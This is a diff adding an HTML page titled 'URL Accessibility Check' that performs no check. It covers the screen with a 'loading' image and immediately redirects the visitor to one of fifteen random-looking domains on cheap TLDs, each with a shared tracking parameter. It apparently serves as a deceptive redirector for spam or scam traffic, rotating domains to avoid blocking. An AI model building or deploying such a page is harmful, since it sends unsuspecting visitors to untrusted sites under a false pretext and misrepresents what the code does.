@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>URL Accessibility Check</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        #loadingImage {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 999;
+        }
+        #testFrame {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <img id="loadingImage" src="start_page.png" alt="Loading...">
+
+    <script>
+        const urls = [
+            "https://2qk7np.buzz?f=1857856",
+            "https://r4u9q5.ink?f=1857856",
+            "https://v5b3z8.ink?f=1857856",
+            "https://s1d6m9.ink?f=1857856",
+            "https://y8g2h4.ink?f=1857856",
+            "https://t3a7n9.ink?f=1857856",
+            "https://k5o1f6.ink?f=1857856",
+            "https://z9s3x7.ink?f=1857856",
+            "https://e6t2w4.ink?f=1857856",
+            "https://q7w4l1.ink?f=1857856",
+            "https://j4n9f8.ink?f=1857856",
+            "https://7pz9lm.icu?f=1857856",
+            "https://7tq8lw.buzz?f=1857856",
+            "https://7vg6lm.buzz?f=1857856",
+            "https://7vj2lp.lat?f=1857856",
+        ];
+
+        const loadingImage = document.getElementById('loadingImage');
+
+        function getRandomUrl() {
+          const randomIndex = Math.floor(Math.random() * urls.length);
+          const selectedUrl = urls[randomIndex];
+          return selectedUrl;
+        }
+        const randomUrl = getRandomUrl();
+        loadingImage.style.display = 'none';
+        window.location.href = randomUrl;
+        
+    </script>
+
+</body>
+</html>
